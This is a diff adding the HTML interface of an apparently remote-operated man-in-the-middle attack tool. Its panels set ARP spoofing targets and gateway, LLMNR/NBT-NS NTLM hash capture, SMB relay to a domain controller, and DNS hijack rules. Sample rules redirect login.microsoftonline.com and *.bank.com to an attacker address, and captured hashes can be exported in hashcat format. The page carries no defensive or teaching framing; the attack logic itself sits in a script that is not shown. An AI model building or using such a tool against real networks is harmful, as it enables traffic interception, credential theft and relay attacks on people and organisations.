@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Mitm</title>
+  <link rel="stylesheet" href="mitm.css" />
+</head>
+<body>
+  <header class="topbar">
+    <h1>Mitm</h1>
+    <span class="tag">arp spoof · dns hijack · relay</span>
+    <span id="statusBadge" class="badge idle">idle</span>
+  </header>
+
+  <main class="layout">
+    <section class="col left">
+      <div class="card">
+        <h2>source client</h2>
+        <label for="clientId">client id</label>
+        <div class="row">
+          <input id="clientId" list="clientsList" placeholder="enter client id" autocomplete="off" />
+          <datalist id="clientsList"></datalist>
+          <button id="refreshClients" class="btn ghost">&#8635;</button>
+        </div>
+        <div id="clientCount" class="hint">no clients seen yet</div>
+        <button id="discover" class="btn ghost block">discover hosts</button>
+        <div id="hostCount" class="hint">no hosts discovered</div>
+      </div>
+
+      <div class="card">
+        <h2>spoofing</h2>
+        <label for="iface">interface</label>
+        <div class="row">
+          <input id="iface" placeholder="auto (or pick one)" />
+          <button id="loadIfaces" class="btn ghost" title="list interfaces">&#8635;</button>
+        </div>
+        <div id="ifaceList" class="hint">auto-detected if blank</div>
+
+        <label for="gateway">gateway (router ip)</label>
+        <input id="gateway" placeholder="auto-detect" />
+
+        <label for="targets">targets (one ip per line, blank = whole arp table)</label>
+        <textarea id="targets" rows="4"></textarea>
+
+        <div class="checks">
+          <label><input type="checkbox" id="captureNTLM" checked /> capture NTLM hashes (LLMNR/NBT-NS)</label>
+          <label><input type="checkbox" id="enableRelay" /> enable SMB relay</label>
+        </div>
+
+        <label for="relayTarget">relay target (host or ip:445)</label>
+        <input id="relayTarget" placeholder="dc01.corp.local" />
+      </div>
+
+      <div class="card">
+        <h2>dns hijack</h2>
+        <label for="dnsSpoof">domain = ip (one per line, <code>*.x</code> for wildcard)</label>
+        <textarea id="dnsSpoof" rows="4" placeholder="login.microsoftonline.com = 10.0.0.50&#10;*.bank.com = 10.0.0.50"></textarea>
+        <label for="dnsUpstream">upstream resolver</label>
+        <input id="dnsUpstream" value="8.8.8.8:53" />
+      </div>
+
+      <div class="card">
+        <h2>actions</h2>
+        <div class="actions">
+          <button id="start" class="btn danger">start</button>
+          <button id="stop" class="btn">stop + restore</button>
+        </div>
+        <div class="hint">stop re-asserts the real ARP mappings so the victim's connectivity returns immediately.</div>
+      </div>
+    </section>
+
+    <section class="col right">
+      <div class="card">
+        <h2>captured hashes <span id="hashCount" class="count">0</span></h2>
+        <table class="tbl">
+          <thead><tr><th>host</th><th>user</th><th>domain</th><th>proto</th><th>hash</th></tr></thead>
+          <tbody id="hashBody"></tbody>
+        </table>
+        <div id="hashEmpty" class="empty">no hashes captured</div>
+        <button id="copyHashes" class="btn ghost block">copy all as hashcat 5600</button>
+      </div>
+
+      <div class="card">
+        <h2>poisoned queries <span id="poisonCount" class="count">0</span></h2>
+        <div id="poisonList" class="feed empty">nothing poisoned yet</div>
+      </div>
+
+      <div class="card">
+        <h2>relay attempts</h2>
+        <div id="relayList" class="feed empty">no relay attempts</div>
+      </div>
+
+      <div class="card">
+        <h2>log</h2>
+        <div id="log" class="log"></div>
+      </div>
+    </section>
+  </main>
+
+  <script src="mitm.js"></script>
+</body>
+</html>
